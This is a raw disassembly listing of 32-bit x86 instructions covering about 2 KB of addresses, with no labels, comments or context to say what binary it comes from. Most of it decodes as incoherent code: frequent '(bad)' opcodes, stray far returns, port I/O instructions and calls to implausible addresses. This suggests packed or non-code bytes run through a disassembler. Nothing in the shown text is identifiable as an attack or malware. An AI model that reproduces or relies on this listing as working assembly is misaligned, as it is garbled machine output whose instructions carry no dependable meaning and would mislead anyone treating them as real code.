  417853:	inc    ebp
  417854:	cld    
  417855:	xor    cl,BYTE PTR [ebx-0xb38b300]
  41785b:	or     BYTE PTR [ebx+0x0],dl
  41785e:	mov    ebx,0x8bd5500
  417863:	call   DWORD PTR [ecx-0x1]
  417866:	pop    es
  417867:	mov    ch,0x33
  417869:	dec    ebx
  41786b:	(bad)  
  41786c:	mov    eax,0x72009ca4
  417871:	push   DWORD PTR [edx]
  417873:	or     BYTE PTR [eax],al
  417875:	jmp    0xff89:0x75c84d03
  41787c:	dec    ebp
  41787d:	loopne 0x41784f
  41787f:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  417885:	add    BYTE PTR [ebx],dh
  417887:	mov    ecx,ebx
  417889:	hlt    
  41788a:	add    ecx,ebx
  41788c:	enter  0x899c,0x32
  417890:	dec    ebp
  417891:	add    ecx,eax
  417893:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  417899:	or     DWORD PTR [ebx-0xb00b29c],0x0
  4178a0:	xor    ecx,ebx
  4178a2:	retf   
  4178a3:	enter  0x4d03,0xc8
  4178a7:	mov    DWORD PTR fs:[eax],ebx
  4178aa:	lea    eax,[eax]
  4178ac:	push   esp
  4178ad:	mov    edi,edi
  4178af:	fs (bad) 
  4178b1:	(bad)  
  4178b2:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  4178b8:	push   0xffffffff
  4178ba:	and    bh,bh
  4178bc:	pop    ecx
  4178bd:	inc    eax
  4178be:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  4178c4:	push   0xffffff8b
  4178c6:	pop    ecx
  4178c7:	cld    
  4178c8:	dec    ebp
  4178c9:	lea    ecx,[ecx+0x45ff08ff]
  4178cf:	mov    BYTE PTR [edx+0x1],cl
  4178d2:	add    BYTE PTR [eax],al
  4178d4:	mov    DWORD PTR [ebp+0x8],0x58008d
  4178db:	dec    DWORD PTR [ebp-0x77]
  4178de:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  4178e5:	cld    
  4178e6:	dec    ebp
  4178e7:	jne    0x41791c
  4178e9:	lea    eax,[ebx]
  4178eb:	push   eax
  4178ec:	mov    edi,edi
  4178ee:	or     BYTE PTR [ecx+0x54a845],cl
  4178f4:	add    al,ch
  4178f6:	(bad)  
  4178f7:	sub    esp,ebp
  4178f9:	add    BYTE PTR [eax],al
  4178fb:	rol    BYTE PTR [eax],0x84
  4178fe:	inc    ebp
  4178ff:	add    dh,BYTE PTR [esi+0x0]
  417902:	add    BYTE PTR [ebp-0x73],al
  417905:	mov    ebp,DWORD PTR [esp+edx*4]
  417908:	inc    DWORD PTR [eax]
  41790a:	lea    ecx,[ebx-0x30074f4]
  417910:	call   0x428495
  417915:	add    BYTE PTR [ebp+0x0],cl
  417918:	jne    0x41795b
  41791a:	dec    DWORD PTR [ebx-0x76210314]
  417920:	dec    ebp
  417921:	add    DWORD PTR [ebp+0x0],esi
  417924:	(bad)  
  417925:	xchg   ebp,eax
  417926:	loopne 0x417927
  417928:	inc    eax
  417929:	inc    DWORD PTR [eax]
  41792b:	mov    ecx,DWORD PTR [ebp-0x4]
  41792e:	xor    edx,DWORD PTR [edx+0x7201b8]
  417934:	add    BYTE PTR [edx],dl
  417936:	enter  0x4d90,0x0
  41793a:	mov    eax,DWORD PTR [eax]
  41793c:	hlt    
  41793d:	add    al,0xa5
  41793f:	mov    al,0xff
  417941:	add    bh,bh
  417943:	add    BYTE PTR [ebx],dh
  417945:	inc    DWORD PTR [ebx]
  417947:	sbb    al,0x89
  417949:	jne    0x417923
  41794b:	mov    esp,DWORD PTR [ecx+0x4500fc]
  417951:	mov    eax,DWORD PTR [ebp-0xff0048]
  417957:	mov    DWORD PTR [eax-0x70],0xee58ed89
  41795e:	inc    DWORD PTR [ebp-0x75]
  417961:	fisttp QWORD PTR [eax+eiz*8]
  417964:	test   DWORD PTR [esi-0x1],esp
  417967:	inc    ebp
  417968:	(bad)  
  417969:	aas    
  41796a:	inc    ebp
  41796b:	(bad)  
  41796c:	lea    edi,[esp+eiz*2-0x1]
  417970:	inc    edi
  417972:	mov    DWORD PTR ds:0x8000c7a0,edi
  417978:	mov    ebp,esi
  41797a:	cld    
  41797b:	in     al,0x8d
  41797d:	inc    ebp
  41797e:	jmp    eax
  417980:	(bad)  
  417981:	fisttp WORD PTR [eax+0x8801c7]
  417987:	jecxz  0x4179ce
  417989:	out    dx,al
  41798a:	inc    DWORD PTR [ebp-0x4]
  41798d:	out    0x8d,eax
  41798f:	aas    
  417990:	inc    edi
  417992:	jmp    FWORD PTR [eax-0x78]
  417995:	inc    DWORD PTR [ecx]
  417997:	mov    DWORD PTR [eax],0xc7a83d
  41799d:	ins    BYTE PTR es:[edi],dx
  41799e:	test   edi,edi
  4179a0:	pandn  mm0,mm5
  4179a3:	aas    
  4179a4:	add    bh,al
  4179a6:	mov    esi,DWORD PTR [eax-0x4]
  4179a9:	inc    DWORD PTR [eax+0xdf01e0]
  4179af:	(bad)  
  4179b0:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4179b4:	mov    ebp,ebx
  4179b6:	xchg   esp,eax
  4179b7:	fild   DWORD PTR [eax]
  4179b9:	(bad)  
  4179ba:	mov    edi,DWORD PTR [eax+0x3]
  4179bd:	(bad)  
  4179be:	cmp    al,0xe7
  4179c0:	dec    ebp
  4179c1:	leave  
  4179c2:	mov    ebp,eax
  4179c4:	fsubr  DWORD PTR [ecx]
  4179c6:	add    BYTE PTR [eax],al
  4179c8:	lea    ecx,[ebx-0x7f0003b4]
  4179ce:	push   edx
  4179cf:	add    DWORD PTR [ebp+0x0],edx
  4179d2:	mov    esi,DWORD PTR [eax]
  4179d4:	mov    WORD PTR [ebx-0x7a750000],?
  4179da:	add    esi,DWORD PTR [ebp-0x78]
  4179dd:	mov    eax,DWORD PTR [eax]
  4179df:	cld    
  4179e0:	push   0x7d
  4179e2:	dec    DWORD PTR [ebx+0xd88c]
  4179e8:	push   edx
  4179e9:	mov    edx,DWORD PTR [ecx-0x4]
  4179ec:	call   DWORD PTR [eax+0x7d01fc]
  4179f2:	mov    ebx,edx
  4179f4:	cld    
  4179f5:	add    BYTE PTR [eax+0x560150],dl
  4179fb:	test   DWORD PTR [ebp+0x75],eax
  4179fe:	in     al,0x8b
  417a00:	in     al,dx
  417a01:	cld    
  417a02:	(bad)  
  417a03:	jge    0x417999
  417a05:	mov    esp,ebx
  417a07:	fsub   st,st(7)
  417a09:	add    bh,al
  417a0b:	mov    ebx,DWORD PTR [eax-0x7a6f8f04]
  417a11:	add    edi,edi
  417a13:	add    bh,bh
  417a15:	mov    eax,0x50d800ed
  417a1a:	inc    ebp
  417a1b:	push   esi
  417a1c:	fisttp WORD PTR [ebx+0x4dc7f43f]
  417a22:	test   BYTE PTR [ebx],dh
  417a24:	fadd   DWORD PTR ds:0x4572c2
  417a2a:	jmp    0x4179ed
  417a2c:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  417a33:	inc    esi
  417a34:	jo     0x417a36
  417a36:	test   edi,eax
  417a38:	jmp    esp
  417a3a:	inc    DWORD PTR [eax]
  417a3c:	in     eax,dx
  417a3d:	add    al,bl
  417a3f:	jne    0x4179c6
  417a41:	mov    edi,edi
  417a43:	cld    
  417a44:	inc    DWORD PTR [ebp-0x12]
  417a47:	mov    esp,esp
  417a49:	mov    ah,0x85
  417a4b:	add    bh,bh
  417a4d:	call   0x119a351
  417a52:	ret    0x858b
  417a55:	cld    
  417a56:	inc    DWORD PTR [eax+0xe301ff]
  417a5c:	out    dx,al
  417a5d:	xor    BYTE PTR [ebp-0xff00cf],al
  417a63:	mov    ebx,ebp
  417a65:	cld    
  417a66:	jo     0x4179f1
  417a68:	or     DWORD PTR [ecx],eax
  417a6a:	add    BYTE PTR [eax],al
  417a6c:	push   eax
  417a6d:	add    DWORD PTR [ebp+0x45],eax
  417a70:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  417a76:	dec    DWORD PTR [ebx-0x3fda0318]
  417a7c:	add    BYTE PTR [ebp-0xbf0040],dl
  417a82:	inc    ebp
  417a83:	or     BYTE PTR [ebx-0x4faf0400],0x45
  417a8a:	add    DWORD PTR [ebx+0x459c00],ecx
  417a90:	mov    edi,edi
  417a92:	mov    eax,0xe80800ff
  417a97:	inc    ebp
  417a98:	sub    BYTE PTR [ebx-0x47000400],cl
  417a9e:	add    al,0x1
  417aa0:	rol    BYTE PTR [eax],0x1e
  417aa3:	jne    0x417aea
  417aa5:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  417aab:	inc    DWORD PTR [ecx]
  417aad:	call   0x86a2b2
  417ab2:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  417ab8:	call   0x41a2be
  417abd:	xor    bh,bh
  417abf:	push   edi
  417ac0:	adc    BYTE PTR [ebx-0x747423bb],al
  417ac6:	loopne 0x417aa4
  417ac8:	ret    
  417ac9:	loopne 0x417a67
  417acb:	xor    DWORD PTR [edx],0x31
  417ace:	cmp    edi,edi
  417ad0:	bswap  esp
  417ad2:	rol    BYTE PTR gs:[eax],0x5
  417ad6:	jmp    0x12c7c20
  417adb:	mov    eax,DWORD PTR [ebp-0x4]
  417ade:	add    BYTE PTR [eax+0xff0100],bh
  417ae4:	cld    
  417ae5:	jne    0x417b64
  417ae7:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  417aed:	push   ss
  417aee:	add    DWORD PTR [eax],eax
  417af0:	add    BYTE PTR [eax+0x7f],dl
  417af3:	inc    ebp
  417af4:	add    BYTE PTR [ebx+0x459850],cl
  417afa:	mov    edi,edi
  417afc:	test   al,0xff
  417afe:	add    BYTE PTR [eax],cl
  417b00:	inc    DWORD PTR [ebp-0x18]
  417b03:	jmp    DWORD PTR ds:0x4d7d00dc
  417b09:	adc    BYTE PTR [ebx+0x459cb9],cl
  417b0f:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  417b15:	pushf  
  417b16:	mov    eax,0x30132
  417b1b:	lea    esi,[ebp+0x2c]
  417b1e:	xor    edi,edi
  417b20:	(bad)  
  417b21:	call   0x140a28e
  417b26:	call   0x135a3b6
  417b2b:	jne    0x417ab8
  417b2d:	xor    edi,esp
  417b2f:	add    eax,DWORD PTR [eax+0xc018d]
  417b35:	push   DWORD PTR [eax]
  417b37:	call   0xcaa293
  417b3c:	int3   
  417b3d:	inc    DWORD PTR [ebp-0x14]
  417b40:	mov    ecx,DWORD PTR [ebp-0x28]
  417b43:	xor    eax,DWORD PTR [eax]
  417b45:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  417b4b:	(bad)  
  417b4c:	xchg   ebp,eax
  417b4d:	in     al,0xff
  417b4f:	add    bh,bh
  417b51:	add    BYTE PTR [ebp+0x45],dl
  417b54:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  417b5a:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff64]
  417b61:	mov    edi,edi
  417b63:	or     BYTE PTR [eax],cl
  417b65:	inc    ebp
  417b66:	test   DWORD PTR gs:[eax],eax
  417b69:	je     0x417bb0
  417b6b:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  417b71:	xor    edx,DWORD PTR [eax-0x73]
  417b74:	push   ebp
  417b75:	or     BYTE PTR [ebp+0x21007572],al
  417b7b:	inc    ebp
  417b7c:	in     al,dx
  417b7d:	mov    ebp,DWORD PTR [eax]
  417b7f:	mov    esp,0x648bc345
  417b84:	fmul   st,st(5)
  417b86:	add    BYTE PTR [ebx],ch
  417b88:	mov    eax,DWORD PTR [ebx]
  417b8a:	cld    
  417b8b:	loopne 0x417b4d
  417b8d:	inc    ebp
  417b8e:	push   ebp
  417b8f:	cmp    ebp,eax
  417b91:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  417b98:	cld    
  417b99:	fadd   DWORD PTR [eax+0x3b014d]
  417b9f:	jne    0x417bd1
  417ba1:	push   0xf8898557
  417ba6:	in     al,dx
  417ba7:	jne    0x417bee
  417ba9:	lea    eax,[ebx+0x72e8dcc8]
  417baf:	das    
  417bb0:	mov    eax,DWORD PTR [eax]
  417bb2:	mov    esp,0x33eb7545
  417bb7:	mov    edi,DWORD PTR [edi+0x4572bc]
  417bbd:	xor    eax,edi
  417bbf:	adc    DWORD PTR [ebp-0xcd0064],0x8be131
  417bc9:	rcl    BYTE PTR [eax-0x40],1
  417bcc:	inc    ebp
  417bcd:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  417bd5:	inc    ebp
  417bd6:	xchg   ebp,eax
  417bd7:	ud0    ebp,DWORD PTR [ebx]
  417bda:	inc    DWORD PTR [eax]
  417bdc:	retf   
  417bdd:	jbe    0x417bdf
  417bdf:	mov    dl,BYTE PTR [eax-0x80]
  417be2:	push   ebp
  417be3:	pop    ds
  417be4:	mov    ecx,DWORD PTR [esp+esi*8]
  417be7:	inc    eax
  417be8:	retf   
  417be9:	inc    ebp
  417bea:	iret   
  417beb:	jb     0x417bb5
  417bed:	mov    eax,DWORD PTR [edi]
  417bef:	enter  0x4545,0x1
  417bf3:	xor    DWORD PTR [eax],eax
  417bf5:	pushf  
  417bf6:	mov    ecx,DWORD PTR [ecx+0x304df0bc]
  417bfc:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  417c03:	dec    ebp
  417c04:	add    BYTE PTR [ebx],dh
  417c06:	inc    ebp
  417c07:	mov    DWORD PTR [ebx-0x3f631b4c],ecx
  417c0d:	xor    dl,BYTE PTR [edx]
  417c0f:	add    eax,DWORD PTR [ebp-0x77]
  417c12:	mov    eax,esp
  417c14:	fmul   DWORD PTR [ebp-0x3d]
  417c17:	xor    eax,DWORD PTR [ebx+eax*1+0x832899c]
  417c1e:	mov    DWORD PTR [ebp-0x28],eax
  417c21:	rol    DWORD PTR [ebp-0x64],1
  417c24:	xor    eax,edi
  417c26:	mov    ecx,0xff858db0
  417c2b:	clc    
  417c2c:	enter  0x4d45,0x32
  417c30:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  417c37:	test   esi,edi
  417c39:	clc    
  417c3a:	inc    DWORD PTR [ebp+0x45]
  417c3d:	cmp    al,0x8b
  417c3f:	pushf  
  417c40:	or     bh,al
  417c42:	enter  0x16a8,0x85
  417c46:	xor    eax,edi
  417c48:	pushf  
  417c49:	inc    ebp
  417c4a:	(bad)  
  417c4b:	ds cld 
  417c4d:	pushf  
  417c4e:	inc    ebp
  417c4f:	mov    edx,DWORD PTR [eax-0x28]
  417c52:	lock push ebp
  417c54:	add    BYTE PTR [ebx],dh
  417c56:	mov    DWORD PTR [ebx],eax
  417c58:	sar    BYTE PTR [ebx],1
  417c5a:	adc    BYTE PTR [edi],cl
  417c5c:	dec    ebp
  417c5d:	adc    al,0x8b
  417c5f:	add    al,dl
  417c61:	jmp    0x1027e31
  417c66:	jb     0x417cb5
  417c68:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  417c6e:	xor    ecx,DWORD PTR [ebp+0x3b]
  417c71:	xor    ecx,DWORD PTR [edi]
  417c73:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  417c77:	(bad)  
  417c79:	clc    
  417c7a:	enter  0x8400,0x8b
  417c7e:	pop    es
  417c7f:	mov    al,0x0
  417c81:	push   ebp
  417c82:	push   cs
  417c83:	xor    ecx,eax
  417c85:	xor    esp,ecx
  417c87:	add    ebp,DWORD PTR [eax]
  417c89:	add    esi,DWORD PTR [eax]
  417c8b:	(bad)  
  417c8d:	retf   0x55c8
  417c90:	repnz mov eax,DWORD PTR [ebp-0x10]
  417c94:	(bad)  
  417c95:	cli    
  417c96:	fdivr  st,st(1)
  417c98:	test   DWORD PTR [eax+edi*8],ecx
  417c9b:	dec    ebp
  417c9c:	inc    ebp
  417c9d:	xor    edi,DWORD PTR [eax-0x7167afd]
  417ca3:	add    BYTE PTR [ebp+0x0],al
  417ca6:	mov    ecx,DWORD PTR [ebp-0x28]
  417ca9:	mov    ecx,ebx
  417cab:	clc    
  417cac:	jne    0x417c79
  417cae:	mov    esi,0xd672d3
  417cb3:	into   
  417cb4:	into   
  417cb5:	scas   eax,DWORD PTR es:[edi]
  417cb6:	dec    ebp
  417cb7:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  417cbd:	sub    ecx,esi
  417cbf:	cmp    ecx,DWORD PTR [ebp+0x77]
  417cc2:	(bad)  
  417cc3:	mov    edi,eax
  417cc5:	mov    al,0x85
  417cc7:	mov    eax,edi
  417cc9:	add    BYTE PTR [ebp-0x75],al
  417ccc:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  417cd3:	xor    eax,DWORD PTR [ebp+0x4503f803]
  417cd9:	(bad)  
  417cdb:	retf   0x559c
  417cde:	(bad)  
  417cdf:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  417ce6:	inc    ebp
  417ce7:	add    eax,0xeb9c4d3f
  417cec:	(bad)  
  417ced:	mov    ecx,esp
  417cef:	lods   al,BYTE PTR ds:[esi]
  417cf0:	test   DWORD PTR [ebp-0x8],edx
  417cf3:	xor    ecx,DWORD PTR [ebp+0x33]
  417cf6:	mov    eax,DWORD PTR [ebx]
  417cf8:	lock add ecx,ebx
  417cfb:	bswap  esi
  417cfd:	retf   0x55d1
  417d00:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  417d06:	jmp    0x417d01
  417d08:	add    BYTE PTR ds:0xebc44d8b,al
  417d0e:	push   ebp
  417d0f:	mov    ebp,DWORD PTR [ebx]
  417d11:	test   al,0x8b
  417d13:	push   ebp
  417d14:	clc    
  417d15:	xor    ecx,ebx
  417d17:	xor    ecx,esi
  417d19:	add    edx,ecx
  417d1b:	add    eax,DWORD PTR [edx+0xca010f]
  417d21:	push   ebp
  417d22:	dec    ebp
  417d23:	mov    ecx,DWORD PTR [ebx-0x34050710]
  417d29:	stc    
  417d2a:	rol    DWORD PTR ds:0xebce4dd6,cl
  417d30:	scas   eax,DWORD PTR es:[edi]
  417d31:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  417d37:	xor    ebp,DWORD PTR [ebx]
  417d39:	xor    edi,DWORD PTR [ebx]
  417d3b:	add    esi,DWORD PTR [edi+0x3]
  417d3e:	mov    ecx,DWORD PTR [edi]
  417d40:	clc    
  417d41:	retf   0x55cb
  417d44:	into   
  417d45:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  417d4c:	mov    eax,0x3376554d
  417d51:	mov    esi,DWORD PTR [ebx]
  417d53:	int3   
  417d54:	add    edx,DWORD PTR [ebp+0x3]
  417d57:	xor    ecx,DWORD PTR [edi]
  417d59:	xor    ecx,edx
  417d5b:	add    edx,DWORD PTR [ebp+0x3]
  417d5e:	mov    ecx,DWORD PTR [edi]
  417d60:	lock retf 0x4dfa
  417d64:	stc    
  417d65:	mov    ecx,DWORD PTR [eax]
  417d67:	or     BYTE PTR [ebp+0x4d],cl
  417d6a:	jmp    0x1057dfa
  417d6f:	dec    ebp
  417d70:	dec    ebp
  417d71:	(bad)  
  417d72:	mov    ebx,esp
  417d74:	clc    
  417d75:	test   ebx,ecx
  417d77:	clc    
  417d78:	ror    DWORD PTR [ebp-0x2a],cl
  417d7b:	mov    esi,ecx
  417d7d:	call   0x33ccc331
  417d82:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  417d89:	retf   
  417d8a:	ja     0x417d5a
  417d8c:	mov    ebp,DWORD PTR [eax-0x48]
  417d8f:	dec    ebp
  417d90:	xor    ecx,DWORD PTR [di+0x3]
  417d94:	mov    esp,esp
  417d96:	clc    
  417d97:	push   ebp
  417d98:	retf   
  417d99:	mov    dl,bl
  417d9b:	adc    esi,edx
  417d9d:	jb     0x417d6d
  417d9f:	add    BYTE PTR [edi-0x3b7474b3],ch
  417da5:	call   0x4d6d4927
  417daa:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  417db0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417db1:	pushf  
  417db2:	inc    ebp
  417db3:	xor    cl,BYTE PTR [ebp-0x78]
  417db6:	mov    edx,edi
  417db8:	clc    
  417db9:	dec    ebp
  417dba:	retf   
  417dbb:	mov    edx,ebx
  417dbd:	call   0x56105198
  417dc2:	scas   eax,DWORD PTR es:[edi]
  417dc3:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  417dc9:	pushf  
  417dca:	sub    esi,DWORD PTR [edx]
  417dcc:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  417dd2:	lods   al,BYTE PTR ds:[esi]
  417dd3:	xor    esp,DWORD PTR [ebx]
  417dd5:	add    ecx,DWORD PTR [ebp-0x1c]
  417dd8:	mov    edi,DWORD PTR [ebp-0x8]
  417ddb:	mov    bl,cl
  417ddd:	cmp    dl,bl
  417ddf:	jb     0x417daf
  417de1:	add    dh,dl
  417de3:	dec    ebp
  417de4:	scas   eax,DWORD PTR es:[edi]
  417de5:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  417deb:	shr    DWORD PTR [ebx],cl
  417ded:	into   
  417dee:	cmp    edx,esi
  417df0:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  417df6:	dec    ebp
  417df7:	dec    ebp
  417df8:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  417dfe:	retf   
  417dff:	xor    edx,esi
  417e01:	add    ecx,esi
  417e03:	imul   ecx,edx
  417e06:	mov    DWORD PTR [ebp+0x8],edx
  417e09:	xor    ecx,DWORD PTR [ebp+0x2b]
  417e0c:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  417e12:	add    esi,DWORD PTR [ebx]
  417e14:	mov    ah,0x3
  417e16:	inc    ebp
  417e17:	rdtsc  
  417e19:	xlat   BYTE PTR ds:[ebx]
  417e1a:	pushf  
  417e1b:	jge    0x417da6
  417e1d:	xor    ebx,eax
  417e1f:	sub    eax,DWORD PTR [ebp-0x73]
  417e22:	(bad)  
  417e23:	cmp    al,al
  417e25:	jb     0x417dac
  417e27:	add    al,bh
  417e29:	ror    DWORD PTR [ebp-0x7a],1
  417e2c:	xor    edi,edi
  417e2e:	add    edi,edi
  417e30:	jmp    0x417e7f
  417e32:	mov    ecx,DWORD PTR [ebx-0x34341324]
  417e38:	dec    ebp
  417e39:	into   
  417e3a:	mov    ebp,DWORD PTR [edi-0x23737428]
  417e40:	pushf  
  417e41:	shl    DWORD PTR [edx],cl
  417e43:	retf   0x5588
  417e46:	or     ecx,DWORD PTR [ebp+0x7233114d]
  417e4c:	add    eax,DWORD PTR [eax]
  417e4e:	in     al,0x4d
  417e50:	push   ebp
  417e51:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  417e57:	fs add ch,cl
  417e5a:	dec    ebp
  417e5b:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  417e61:	dec    ebp
  417e62:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  417e68:	jge    0x417e38
  417e6a:	mov    BYTE PTR [edi+0xf723b3a],ch
  417e70:	add    cl,dh
  417e72:	dec    ebp
  417e73:	dec    DWORD PTR [ebx-0x2c032375]
  417e79:	adc    BYTE PTR [ebp+0x1],0x8b
  417e7d:	add    al,bl
  417e7f:	jge    0x417e0d
  417e81:	push   0xffffff9c
  417e83:	push   0x8b3032
  417e88:	shl    BYTE PTR [ebp+0x55],0x6a
  417e8c:	xor    edi,edi
  417e8e:	xor    edx,DWORD PTR [ebx+eax*1]
  417e91:	inc    ebp
  417e92:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  417e98:	dec    ebp
  417e99:	or     BYTE PTR [ecx+0x4dc8e483],cl
  417e9f:	jbe    0x417e2c
  417ea1:	mov    ebp,esp
  417ea3:	ror    bl,1
  417ea5:	enter  0x14ce,0xaf
  417ea9:	dec    DWORD PTR [ebx-0x2cef17f8]
  417eaf:	push   ebp
  417eb0:	retf   0x5540
  417eb3:	push   ebp
  417eb4:	mov    esi,DWORD PTR [edx-0x1c]
  417eb7:	mov    edx,ebx
  417eb9:	cld    
  417eba:	(bad)  
  417ebb:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  417ec2:	sti    
  417ec3:	add    dh,cl
  417ec5:	push   0xffffff94
  417ec7:	call   FWORD PTR [eax+edx*8-0x74c4afce]
  417ece:	bswap  esp
  417ed0:	pop    esi
  417ed1:	inc    ebp
  417ed2:	dec    DWORD PTR [ecx+0x45e8c88b]
  417ed8:	push   ebp
  417ed9:	xor    esi,DWORD PTR [ebx]
  417edb:	mov    DWORD PTR [ebx],0xcac00f9c
  417ee1:	aas    
  417ee2:	push   ebp
  417ee3:	inc    ebp
  417ee4:	xor    ecx,eax
  417ee6:	add    ecx,eax
  417ee8:	mov    eax,DWORD PTR [ebx]
  417eea:	(bad)  
  417eeb:	jmp    0x417e79
  417eed:	mov    bl,BYTE PTR [ebp+eax*1-0x2f7674ce]
  417ef4:	les    edi,FWORD PTR [esi-0xeccefb3]
  417efa:	mov    edx,0xff378d80
  417eff:	mov    dh,0xd1
  417f01:	cmp    edx,DWORD PTR [ebp+0xf]
  417f04:	mov    eax,DWORD PTR [edx-0x20]
  417f07:	add    BYTE PTR [ebp-0x75],bh
  417f0a:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  417f11:	pushf  
  417f12:	retf   0x8632
  417f15:	cmp    ebp,0x8
  417f18:	call   ebx
  417f1a:	inc    ebp
  417f1b:	inc    ebp
  417f1c:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  417f22:	mov    esi,DWORD PTR [ecx]
  417f24:	enter  0x49c,0xc7
  417f28:	add    al,al
  417f2a:	add    bl,al
  417f2c:	(bad)  
  417f2d:	clc    
  417f2e:	enter  0x45,0x31
  417f32:	push   eax
  417f33:	pushf  
  417f34:	mov    edi,eax
  417f36:	int3   
  417f37:	or     al,al
  417f39:	test   DWORD PTR [edi],edi
  417f3b:	clc    
  417f3c:	gs inc ebp
  417f3e:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  417f44:	push   ss
  417f45:	xor    ecx,DWORD PTR [ebp+0x3]
  417f48:	sub    edx,DWORD PTR [ecx-0x76]
  417f4b:	dec    ebp
  417f4c:	add    DWORD PTR [ebx+0x88d845],ecx
  417f52:	mov    esi,DWORD PTR [ebx]
  417f54:	or     BYTE PTR [ebx],al
  417f56:	cmp    edx,DWORD PTR [ecx-0x38]
  417f59:	dec    ebp
  417f5a:	out    dx,eax
  417f5b:	xor    eax,DWORD PTR [ebp+0x3]
  417f5e:	mov    edx,DWORD PTR [ecx-0x28]
  417f61:	dec    ebp
  417f62:	add    BYTE PTR [ebx],dh
  417f64:	push   0x518003
  417f69:	push   eax
  417f6a:	add    BYTE PTR [ebx-0x300748b],cl
  417f70:	sbb    BYTE PTR [ebp+0x45],cl
  417f73:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  417f79:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  417f7f:	dec    ebp
  417f80:	inc    ebp
  417f81:	xor    ecx,eax
  417f83:	add    ecx,eax
  417f85:	push   ecx
  417f86:	(bad)  
  417f87:	dec    ebp
  417f88:	mov    al,ds:0xc5e03dff
  417f8d:	retf   
  417f8e:	(bad)  
  417f8f:	into   
  417f90:	sub    bh,bh
  417f92:	dec    esp
  417f93:	adc    al,0x9c
  417f95:	inc    ebp
  417f96:	push   ebp
  417f97:	test   DWORD PTR [edi],ecx
  417f99:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab8ff80]
  417fa0:	jmp    0xc9ba8eb4
  417fa5:	add    cl,dl
  417fa7:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  417fb1:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  417fb7:	rol    BYTE PTR [eax],0x55
  417fba:	clc    
  417fbb:	fs jb  0x417fc5
  417fbe:	mov    eax,DWORD PTR [ebp-0x30]
  417fc1:	xor    al,0x40
  417fc3:	sub    al,0xc7
  417fc5:	mov    ah,ch
  417fc7:	add    DWORD PTR [ebp+0x4534f845],eax
  417fcd:	sub    al,0x86
  417fcf:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  417fd6:	mov    ch,0xff
  417fd8:	clc    
  417fd9:	add    DWORD PTR [ebp+0x60],0x3d
  417fdd:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  417fe4:	inc    ebp
  417fe5:	dec    DWORD PTR [ebx-0x341ff701]
  417feb:	test   esi,ecx
  417fed:	dec    DWORD PTR [ebx-0x7f8a3301]
  417ff3:	push   eax
  417ff4:	add    DWORD PTR [ebp+0x0],eax
  417ff7:	dec    ebx
  417ff9:	or     al,0xce
  417ffb:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  418002:	into   
  418003:	add    BYTE PTR [ebx-0x34ff1400],cl
  418009:	mov    esi,ecx
  41800b:	sar    bh,0x45
  41800e:	adc    al,0x8b
  418010:	clc    
  418011:	fadd   DWORD PTR [ebp+0x0]
  418014:	mov    ebp,DWORD PTR [edx+0x8]
  418017:	push   edi
  418018:	adc    BYTE PTR [eax+0x1],0x83
  41801c:	add    al,al
  41801e:	retf   
  41801f:	mov    ecx,esi
  418021:	cld    
  418022:	mov    eax,DWORD PTR [eax+0xcb01cc]
  418028:	into   
  418029:	add    BYTE PTR [ebx+0x756aec00],cl
  41802f:	jne    0x418064
  418031:	inc    DWORD PTR [ebx]
  418033:	rcl    BYTE PTR [ecx+0x50],1
  418036:	push   eax
  418037:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  41803d:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  418044:	sar    bh,0x84
  418047:	or     BYTE PTR [ebx],al
  418049:	push   eax
  41804a:	add    BYTE PTR [ebx+0x4532c845],cl
  418050:	pushf  
  418051:	xor    edi,eax
  418053:	pushf  
